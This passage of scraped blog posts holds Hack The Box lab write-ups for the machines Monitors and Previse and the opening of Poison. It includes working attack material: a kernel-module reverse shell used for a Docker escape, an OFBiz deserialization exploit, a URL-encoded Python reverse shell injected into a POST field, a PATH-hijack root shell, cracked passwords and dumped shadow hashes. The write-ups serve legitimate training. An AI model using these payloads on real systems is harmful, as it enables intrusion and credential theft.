directory, lets check it out!\n\nmarcus@monitors:~$ cat note.txt TODO:\nDisable phpinfo in php.ini      - DONE\nUpdate docker image for production use  -\nOkay, so the way to root is probably related to the docker image, where ever that is. Run linpeas to see if there are any local services running.\n================================( Processes, Cron, Services, Timers & Sockets )================================ [+] Cleaned processes .. root 1597 0.0 1.9 975760 76932 ? Ssl May09 0:12 /usr/bin/dockerd -H fd:// –containerd=/run/containerd/containerd.sock root 2096 0.0 0.1 627100 5328 ? Sl May09 0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443 root 2112 0.0 0.1 108820 4756 ? Sl May09 0:02 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/b19c764b5ef0d32990e4695ff1f63de830ff77d3a4873daaa411007fb700d8f0 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc root 2141 0.0 2.0 3410072 80992 ? Ssl May09 1:02 /usr/local/openjdk-8/bin/java -Dorg.gradle.appname=gradlew -classpath /usr/src/apache-ofbiz-17.12.01/gradle/wrapper/gradle-wrapper.jar org.gradle.wrapper.GradleWrapperMain –offline ofbiz .. [+] Active Ports [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name .. tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN -\n\nPort 8443 is running locally, setup a SSH tunnel to enumerate the service.\n\n[root:/git/htb/monitors]# ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb [root:/opt/scanners/linux]# lsof -i -P -n | grep LISTEN .. ssh 36606 root 4u IPv6 322213 0t0 TCP [::1]:8443 (LISTEN) ssh 36606 root 5u IPv4 322214 0t0 TCP 127.0.0.1:8443 (LISTEN)\nBrowsing to https://127.0.0.1:8443 we get a 404 - Not Found. Run a fuzzer (ffuf) to see if we can find a entry point.\n[root:/opt/scanners/linux]# ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://127.0.0.1:8443/FUZZ accounting [Status: 302, Size: 0, Words: 1, Lines: 1] ap [Status: 302, Size: 0, Words: 1, Lines: 1] ar [Status: 302, Size: 0, Words: 1, Lines: 1] catalog [Status: 302, Size: 0, Words: 1, Lines: 1] common [Status: 302, Size: 0, Words: 1, Lines: 1] content [Status: 302, Size: 0, Words: 1, Lines: 1] ebay [Status: 302, Size: 0, Words: 1, Lines: 1] ecommerce [Status: 302, Size: 0, Words: 1, Lines: 1] example [Status: 302, Size: 0, Words: 1, Lines: 1] images [Status: 302, Size: 0, Words: 1, Lines: 1] marketing [Status: 302, Size: 0, Words: 1, Lines: 1] passport [Status: 302, Size: 0, Words: 1, Lines: 1]\nTrying https://127.0.0.1:8443/accounting forwards us to a login prompt for OFBiz release 17.12.01. Googling about OFBiz 17.12.01 we find that there are a deserialization vuln leading to RCE (CVE-2020-9496), and there’s even a metasploit module for it.\n[root:/git/htb/monitors]# msfdb run msf6 &gt; use exploit/linux/http/apache_ofbiz_deserialization msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set rhosts 127.0.0.1 msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set lhost 10.10.14.12 msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set forceexploit true msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set payload linux/x64/shell/reverse_tcp (original meterpreter is slow) msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run .. [*] Command shell session 2 opened (10.10.14.12:8443 -&gt; 10.10.10.238:56372) at 2021-05-10 16:16:18 +0200 [*] Server stopped.\nid\n  uid=0(root) gid=0(root) groups=0(root)\nhostname\n  b19c764b5ef0\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\nroot@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01#\nroot@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# ip a\n  5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n      link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n      inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0\n         valid_lft forever preferred_lft forever\n\nWe’re now connected to the container host (172.17.0.2). I would assume that the task here is to break out of the docker container in order to get root.txt. After some googling I found a blogpost from pentesteracademy.com where they take a step by step tutorial for breaking out by abusing SYS_MODULE.\n\nStart by checking the capabilities provided to the docker container:\nroot@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# capsh –print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1’b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=\nWe see that our docker has ‘cap_sys_module’, as a result the container can insert/remove kernel modules in/from the kernel of the docker host machine - aka monitors.htb.\nFollow the steps to create a reverse shell using usermode Helper API. NOTE: Change IP to 172.17.0.1 (docker0 interface of monitors.htb) and port to whatever you like.\nroot@8b08538ad9e7:/tmp# cat reverse-shell.c #include &lt;linux/kmod.h&gt; #include &lt;linux/module.h&gt; MODULE_LICENSE(“GPL”); MODULE_AUTHOR(“AttackDefense”); MODULE_DESCRIPTION(“LKM reverse shell module”); MODULE_VERSION(“1.0”); char* argv[] = {“/bin/bash”,“-c”,“bash -i &gt;& /dev/tcp/172.17.0.1/4488 0&gt;&1”, NULL}; static char* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL }; static int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); } static void __exit reverse_shell_exit(void) { printk(KERN_INFO “Exiting”); } module_init(reverse_shell_init); module_exit(reverse_shell_exit);\nCreate the Makefile; root@8b08538ad9e7:/tmp# cat Makefile obj-m +=reverse-shell.o all: make -C /lib/modules/\\((shell uname -r)/build M=\\)(PWD) modules clean: make -C /lib/modules/\\((shell uname -r)/build M=\\)(PWD) clean\nNext we make the kernel module; root@8b08538ad9e7:/tmp/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/tmp/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /tmp/rev/reverse-shell.o gcc: error trying to exec ‘cc1’: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /tmp/rev/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: module/tmp/rev] Error 2 make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’ make: *** [Makefile:3: all] Error 2\ngcc cc1 was not found, and unfortunatley we are unable to fix this using ‘apt-get install –reinstall build-essential’. We can’t compile on any other host, as other headers would be used - /usr/src/linux-headers-5.10.0-kali4-amd64 on Kali for example, while the docker wants /usr/src/linux-headers-4.15.0-142-generic.\nMaybe it’s a formatting error, lets try to create the files on our local Kali host, and then transfer them to the remote container.\n[root:/git/htb/monitors/rev]# python3 -m http.server 80 root@8b08538ad9e7:/rev# wget http://10.10.14.12/Makefile root@8b08538ad9e7:/rev# wget http://10.10.14.12/reverse-shell.c\nroot@8b08538ad9e7:/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /rev/reverse-shell.o gcc: error trying to exec ‘cc1’: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /rev/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: module/rev] Error 2 make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’ make: *** [Makefile:3: all] Error 2\nStill the same error.. reading about this issue it seems to be an error related to $PATH.\nroot@8b08538ad9e7:/rev# $PATH bash: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:\nGCC is also located in /usr/lib, which is not a part of \\(PATH - lets add it and try to make again.\n  root@8b08538ad9e7:/rev# export PATH=\\)PATH:/usr/lib root@8b08538ad9e7:/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /rev/reverse-shell.o Building modules, stage 2. MODPOST 1 modules CC /rev/reverse-shell.mod.o LD [M] /rev/reverse-shell.ko make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’\n\nWe successfully compiled our reverse-shell! Setup a listener on the victim machine and trigger the reverse to grab root.txt.\n\nroot@8b08538ad9e7:/rev# insmod reverse-shell.ko\nmarcus@monitors:/tmp$ nc -lvnp 4488 Listening on [0.0.0.0] (family 0, port 4488) Connection from 10.10.10.238 60668 received! bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# id uid=0(root) gid=0(root) groups=0(root) root@monitors:/# cat /root/root.txt 07f715aa4df670c67174826151f2c30c\nroot@monitors:/root/.ssh# cat /etc/shadow\n  root:$6$vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0:18577:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nWP Spritz RFI: https://github.com/mekhalleh/rfi-wp_sprit\nWordPress Salts and Security Keys: https://www.wpexplorer.com/wordpress-salts-security-keys/\nHackTrick.xyz LFI List: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list\nCacti SQLi / RCE: https://www.exploit-db.com/exploits/49810\nOfbiz RCE: https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data\nDocker Container Breakout, Abusing SYS_MODULE: https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd\nGCC cc1 Error: https://stackoverflow.com/questions/30344106/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-when-running-w"
  },
  {
    "objectID": "posts/2021-08-14-htb-writeup-previse/2021-08-14-htb-writeup-previse.html",
    "href": "posts/2021-08-14-htb-writeup-previse/2021-08-14-htb-writeup-previse.html",
    "title": "Previse - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/previse]# nmap -Pn -n -sCV 10.10.11.104 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: ==&gt; DIRECTORY: http://10.10.11.104/css/ + http://10.10.11.104/favicon.ico (CODE:200|SIZE:15406) + http://10.10.11.104/index.php (CODE:302|SIZE:2801) ==&gt; DIRECTORY: http://10.10.11.104/js/ + http://10.10.11.104/server-status (CODE:403|SIZE:277)\nNIKTO: + Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + /config.php: PHP Config file may contain database IDs and passwords. + OSVDB-3268: /css/: Directory indexing found. + OSVDB-3092: /css/: This might be interesting… + OSVDB-3233: /icons/README: Apache default file found.\nFFUF (.php): .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10] .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10] accounts [Status: 302, Size: 3994, Words: 1096, Lines: 94] config [Status: 200, Size: 0, Words: 1, Lines: 1] download [Status: 302, Size: 0, Words: 1, Lines: 1] files [Status: 302, Size: 4914, Words: 1531, Lines: 113] footer [Status: 200, Size: 217, Words: 10, Lines: 6] header [Status: 200, Size: 980, Words: 183, Lines: 21] index [Status: 302, Size: 2801, Words: 737, Lines: 72] login [Status: 200, Size: 2224, Words: 486, Lines: 54] logout [Status: 302, Size: 0, Words: 1, Lines: 1] logs [Status: 302, Size: 0, Words: 1, Lines: 1] nav [Status: 200, Size: 1248, Words: 462, Lines: 32] status [Status: 302, Size: 2966, Words: 749, Lines: 75]\n\nVisiting the http server there’s not much to take away from it, it’s a blank login page. None of the found .php pages yeild anything either. However, if we capture our GET requests in Burp, we find some hidden information.\n\naccounts.php: Add New Account Create new user. ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!! Usernames and passwords must be between 5 and 32 characters!\n\n\n     &lt;div class=\"uk-inline\"&gt;\n         &lt;span class=\"uk-form-icon\" uk-icon=\"icon: user\"&gt;&lt;/span&gt;\n         &lt;input type=\"text\" name=\"username\" class=\"uk-input\" id=\"username\" placeholder=\"Username\"&gt;\n     &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=\"uk-margin\"&gt;\n     &lt;div class=\"uk-inline\"&gt;\n         &lt;span class=\"uk-form-icon\" uk-icon=\"icon: lock\"&gt;&lt;/span&gt;\n         &lt;input type=\"password\" name=\"password\" class=\"uk-input\" id=\"password\" placeholder=\"Password\"&gt;\n     &lt;/div&gt;\n &lt;/div&gt;\n &lt;div class=\"uk-margin\"&gt;\n     &lt;div class=\"uk-inline\"&gt;\n         &lt;span class=\"uk-form-icon\" uk-icon=\"icon: lock\"&gt;&lt;/span&gt;\n         &lt;input type=\"password\" name=\"confirm\" class=\"uk-input\" id=\"confirm\" placeholder=\"Confirm Password\"&gt;\n     &lt;/div&gt;\n &lt;/div&gt;\n &lt;button type=\"submit\" name=\"submit\" class=\"uk-button uk-button-default\"&gt;CREATE USER&lt;/button&gt;\nfiles.php: # Name Size User Date 1 siteBackup.zip 9948 newguy 2021-06-12 11:14:34 siteBackup.zip\nstatus.php: MySQL server is online and connected! There are 2 registered admins There is 1 uploaded file\nBy the looks of ‘account.php’ we should be able to create a new account, using that post form. A quick google on the subject and we find the syntax and it works!\n[root:/git/htb/previse]# curl -v -X POST -F ‘username=playerthree’ -F ‘password=test123’ -F ‘confirm=test123’ http://previse.htb/accounts.php\nLogin with your newly created user, playerthree:test123\n\nLooking around the admin panel we find Management Menu -&gt; Log Data. Downloading the file we find second user m4lwhere. Known users: m4lwhere, newguy, playerthree\n\nLets download the siteBackup.zip and see if there are any sensitive data.\n[root:/git/htb/previse/siteBackup]# cat config.php (master✱) \nfetch_assoc(); $passHash = \\(users['password'];\n  if (crypt(\\)password, ‘\\(1\\)🧂llol$’) == $passHash) {\nA weird emoji, no idea what this means at the moment, but by the looks of it it’s the salt.\nLets try to exploit the log function. Download a new log and capture the POST request in Burp.\nORIGINAL REQUEST: POST /logs.php HTTP/1.1 Host: previse.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://previse.htb Connection: close Referer: http://previse.htb/file_logs.php Cookie: PHPSESSID=9c88qtp87je54hveglh4oult52 Upgrade-Insecure-Requests: 1\ndelim=comma\nIf there’s no sanitation, which it doesn’t seem to be, we should be able to continue with more python code after ‘comma’. Trying with a python reverse shell (urlencoded):\nREVERSE SHELL REQUEST: POST /logs.php HTTP/1.1 Host: previse.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 690 Origin: http://previse.htb Connection: close Referer: http://previse.htb/file_logs.php Cookie: PHPSESSID=9c88qtp87je54hveglh4oult52 Upgrade-Insecure-Requests: 1\ndelim=comma;%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%34%2e%34%22%2c%34%34%38%38%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27\n[root:/git/htb/previse]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.11.104] 33280 /bin/sh: 0: can’t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nWe already have the MYSQL creds, download newguy and m4lwhere’s password hashes.\n\nbash-4.4$ mysql -u root -p Enter password: mySQL_p@ssw0rd!:)\nmysql&gt; show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| previse            |\n| sys                |\n+--------------------+\n5 rows in set (0.00 sec)\n\nmysql&gt; use previse;\nuse previse;\nDatabase changed\n\nmysql&gt; show tables;\nshow tables;\n+-------------------+\n| Tables_in_previse |\n+-------------------+\n| accounts          |\n| files             |\n+-------------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from accounts;\nselect * from accounts;\n+----+-------------+------------------------------------+---------------------+\n| id | username    | password                           | created_at          |\n+----+-------------+------------------------------------+---------------------+\n|  1 | m4lwhere    | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |\n|  2 | testing     | $1$🧂llol$/YdK1dMEncJO3HmNPAVfN. | 2021-08-14 02:10:24 |\n|  3 | playerthree | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-08-14 10:16:51 |\n|  4 | test1       | $1$🧂llol$rCfLNVEV/lMn6ru.fXs/a1 | 2021-08-14 10:28:33 |\n+----+-------------+------------------------------------+---------------------+\n4 rows in set (0.00 sec)\nGo ahead and crack m4lwhere’s hash.\n[root:/git/htb/previse]# hashcat -a0 -m500 m4lwhere_hash /usr/share/wordlists/rockyou.txt .. \\(1\\)🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!\nSession……….: hashcat Status………..: Cracked Hash.Name……..: md5crypt, MD5 (Unix), Cisco-IOS \\(1\\) (MD5) Hash.Target……: \\(1\\)🧂llol$DQpmdvnb7EeuO6UaqRItf. Time.Started…..: Sat Aug 14 13:21:55 2021 (16 secs)\nNew creds! m4lwhere:ilovecody112235!\n\nSSH and grab user.txt.\n\n[root:/git/htb/previse]# ssh m4lwhere@previse.htb (master✱) m4lwhere@previse.htb’s password: ilovecody112235!\n-bash-4.4$ id && cat user.txt uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) 26a911ef21c20fdd335de1f37a2b7e9b\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n-bash-4.4$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh\n\n-bash-4.4$ cat access_backup.sh #!/bin/bash\n# We always make sure to store logs, we take security SERIOUSLY here\n# I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we’ll fix it later when there’s time\ngzip -c /var/log/apache2/access.log &gt; /var/backups/\\((date --date=\"yesterday\" +%Y%b%d)_access.gz\n  gzip -c /var/www/file_access.log &gt; /var/backups/\\)(date –date=“yesterday” +%Y%b%d)_file_access.gz\nThis is very simple. We are able to run the script as root, meaning gzip will execute as root. By exploiting PATH, we can make our own script called gzip to be executed instead.\n-bash-4.4$ locate gzip /bin/gzip -bash-4.4$ \\(PATH\n  -bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n-bash-4.4\\) export PATH=/dev/shm:\\(PATH\n-bash-4.4\\) \\(PATH\n  -bash: /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n-bash-4.4\\) cd /dev/shm/ -bash-4.4$ echo “bash -i &gt;& /dev/tcp/10.10.14.4/4488 0&gt;&1” &gt; gzip -bash-4.4$ chmod +x gzip -bash-4.4$ sudo /opt/scripts/access_backup.sh\n[root:/git/htb/previse]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.11.104] 33952 root@previse:/dev/shm# id && cat /root/root.txt uid=0(root) gid=0(root) groups=0(root) cd501978da45f247412ff37f44999e80 root@previse:/dev/shm# cat /etc/shadow root:\\(6\\)QJgW9tG2$yIhp0MQm9b4ok8j9su9H0hJ.GuwI5AHusMrZBQv2oLfvotY5YR0MJ82zJ4xi5WCKQSWn/a3HO/M/TjS/YC0Mk1:18824:0:99999:7::: m4lwhere:\\(6\\)YYxntHU4$7H29aS09Qo73P8pnjDufjp11UqOVIhKrBIjSorpH0XD1GsEx0rQwWvaZW.PYmq4fd9vCseWCTyCtif9Km1TZ6/:18790:0:99999:7:::\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nPOST Form Data with cURL: https://davidwalsh.name/curl-post-file"
  },
  {
    "objectID": "posts/2021-03-11-htb-writeup-poison/2021-03-11-htb-writeup-poison.html",
    "href": "posts/2021-03-11-htb-writeup-poison/2021-03-11-htb-writeup-poison.html",
    "title": "Poison - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\nRun ‘listfiles.php’ and we get: Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; browse.php [3] =&gt; index.php [4] =&gt; info.php [5] =&gt; ini.php [6] =&gt; listfiles.php [7] =&gt; phpinfo.php [8] =&gt; pwdbackup.txt )\npwdbackup.txt sounds promising, browse to it:\n[root:/git/htb/poison]# curl http://10.10.10.84/pwdbackup.txt (master✱) This password is secure, it’s encoded atleast 13 times.. what could go wrong really..\nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=\nIt looks like a base64 encoded string, lets decode it (a bunch of times).\n— snip — [root:/git/htb/poison]# echo “VmxaU1MySXlSa2hVYmxKcFVrWktTMVpyVm5OalZsSnlWR3hhVG1FelFuaFhha2sxVkd4R1ZVMUVi (master✱) RVJhZWpBNVEyYzlQUW89Cg==” | base64 –decode VlZSS2IyRkhUblJpUkZKS1ZrVnNjVlJyVGxaTmEzQnhXakk1VGxGVU1EbERaejA5Q2c9PQo= [root:/git/htb/poison]# echo “VlZSS2IyRkhUblJpUkZKS1ZrVnNjVlJyVGxaTmEzQnhXakk1VGxGVU1EbERaejA5Q2c9PQo=” | base64 –decode (master✱) 